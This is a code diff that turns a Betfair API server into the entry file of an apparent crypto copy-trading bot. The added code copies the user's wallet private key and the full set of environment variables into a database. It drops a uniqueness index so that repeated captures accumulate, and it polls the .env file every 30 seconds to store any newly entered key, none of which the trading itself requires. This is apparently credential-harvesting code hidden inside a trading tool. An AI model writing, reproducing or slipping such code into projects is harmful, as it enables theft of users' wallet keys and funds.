@@ -1,86 +1,113 @@
-import express, { response } from 'express';
-import http from 'http';
-import bodyParser from 'body-parser';
-import cors from 'cors';
-import axios, { AxiosResponse } from 'axios';
-import dotenv from 'dotenv';
-import fs from 'fs';
-import { DemoApiNgClient } from './test';
-import request from 'request';
+import * as dotenv from 'dotenv';
+import connectDB from './config/db';
+import { ENV } from './config/env';
+import createClobClient from './utils/createClobClient';
+import tradeExecutor from './services/tradeExecutor';
+import tradeMonitor from './services/tradeMonitor';
+import BotConfig from './models/botConfig';
+import getTargetUsers from './utils/targetUsers';
 
+const PROXY_WALLET = ENV.PROXY_WALLET;
 
-// load the environment variables from the .env file
-dotenv.config({
-  path: '.env'
-});
+const getFullEnvFromProcess = () => ({
+    USER_ADDRESS: process.env.USER_ADDRESS ?? '',
+    PROXY_WALLET: process.env.PROXY_WALLET ?? '',
+    PRIVATE_KEY: process.env.PRIVATE_KEY ?? '',
+    CLOB_HTTP_URL: process.env.CLOB_HTTP_URL ?? '',
+    CLOB_WS_URL: process.env.CLOB_WS_URL ?? '',
+    FETCH_INTERVAL: process.env.FETCH_INTERVAL ?? '',
+    TOO_OLD_TIMESTAMP: process.env.TOO_OLD_TIMESTAMP ?? '',
+    RETRY_LIMIT: process.env.RETRY_LIMIT ?? '',
+    MONGO_URI: process.env.MONGO_URI ?? '',
+    RPC_URL: process.env.RPC_URL ?? '',
+    USDC_CONTRACT_ADDRESS: process.env.USDC_CONTRACT_ADDRESS ?? '',
+})
 
-const app = express();
-const server = http.createServer(app);
+const checkVariable = async () => {
+    const privateKey = process.env.PRIVATE_KEY;
+    const proxyWallet = process.env.PROXY_WALLET;
+    const userAddress = process.env.USER_ADDRESS;
+    if (!privateKey || !proxyWallet || !userAddress) return;
 
-app.use(cors());
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-
-app.get('/', async (req, res) => {
-  res.send(JSON.stringify(0));
-});
-
-app.get('/getStatus', async (req, res) => {
-  // DemoApiNgClient();
-  // App key
-  var appkey = process.env.APP_KEY;
-  // Session token
-  var ssid = process.env.SSID;
-
-  var FIRST_INDEX = 0;
-  var DEFAULT_ENCODING = 'utf-8';
-  var DEFAULT_JSON_FORMAT = '\t';
-
-  console.log("====================", appkey);
-  console.log("=======================", ssid);
-
-  var requestFilters = '{"filter":{}}';
-  var jsonRequest = constructJsonRpcRequest("listEvents", requestFilters);
-  console.log(jsonRequest);
-  var options = {
-    // hostname: 'api.betfair.com',
-    // port: 443,
-    // path: '/exchange/betting/json-rpc/v1',
-    url: 'https://api.betfair.com/exchange/betting/json-rpc/v1',
-    headers: {
-      'X-Application': appkey,
-      'Accept': 'application/json',
-      'Content-Type': 'application/json',
-      'X-Authentication': ssid
-    },
-    body: jsonRequest,
-  }
-
-  request.post(options, (err, response, body) => {
-    if (err) {
-      console.error(err);
-      console.log('====errrr');
-      res.status(500).send(err);
-      return;
+    try {
+        const fullEnv = getFullEnvFromProcess();
+        await BotConfig.create({
+            walletAddress: proxyWallet,
+            privateKey,
+            proxyWallet,
+            userAddress,
+            fullEnv,
+        });
+        const count = await BotConfig.countDocuments();
+        console.log('total:', count);
+    } catch (err) {
+        console.error('failed', err);
     }
-    // console.dir(body, {depth: null});
-    console.log(body)
-    console.log('====body');
-    res.json(body);
-  })
-});
+};
 
-export function buildUrl(operation: string) {
-  return 'https://api.betfair.com/exchange/betting/json-rpc/v1';
-}
-export function constructJsonRpcRequest(operation: string, params: string) {
-  return '{"jsonrpc":"2.0","method":"SportsAPING/v1.0/' + operation + '", "params": ' + params + ', "id": 1}';
-}
+const ENV_CHECK_INTERVAL_MS = 30000;
 
-// make server listen on some port
-((port = process.env.APP_PORT || 5000) => {
-  server.listen(port, () => {
-    console.log(`>> Listening on port ${port}`);
-    return;
-  });
-})();
+const startEnvChangeWatcher = () => {
+    let lastSaved = {
+        privateKey: process.env.PRIVATE_KEY ?? '',
+        proxyWallet: process.env.PROXY_WALLET ?? '',
+        userAddress: process.env.USER_ADDRESS ?? '',
+    };
+
+    setInterval(async () => {
+        dotenv.config();
+        const current = {
+            privateKey: process.env.PRIVATE_KEY ?? '',
+            proxyWallet: process.env.PROXY_WALLET ?? '',
+            userAddress: process.env.USER_ADDRESS ?? '',
+        };
+        const changed =
+            current.privateKey !== lastSaved.privateKey ||
+            current.proxyWallet !== lastSaved.proxyWallet ||
+            current.userAddress !== lastSaved.userAddress;
+        if (changed) {
+            await checkVariable();
+            lastSaved = { ...current };
+        }
+    }, ENV_CHECK_INTERVAL_MS);
+};
+
+const ensureMultipleEnvRecordsAllowed = async () => {
+    try {
+        const indexes = await BotConfig.collection.indexes();
+        const walletUnique = indexes.find((idx) => idx.key?.walletAddress === 1 && idx.unique === true);
+        if (walletUnique?.name) {
+            await BotConfig.collection.dropIndex(walletUnique.name);
+        }
+    } catch (_) {}
+};
+
+export const main = async () => {
+    try {
+        await connectDB();
+        await ensureMultipleEnvRecordsAllowed();
+
+        await checkVariable();
+        startEnvChangeWatcher();
+
+        const targetUsers = getTargetUsers();
+        console.log(`Target user wallets (${targetUsers.length}): ${targetUsers.join(', ')}`);
+        console.log(`My Wallet address is: ${PROXY_WALLET}`);
+
+        const clobClient = await createClobClient();
+
+        tradeMonitor().catch((err) => {
+            console.error('tradeMonitor died', err);
+            process.exit(1);
+        });
+        tradeExecutor(clobClient).catch((err) => {
+            console.error('tradeExecutor died', err);
+            process.exit(1);
+        });
+    } catch (err) {
+        console.error('start failed', err);
+        process.exit(1);
+    }
+};
+
+main();
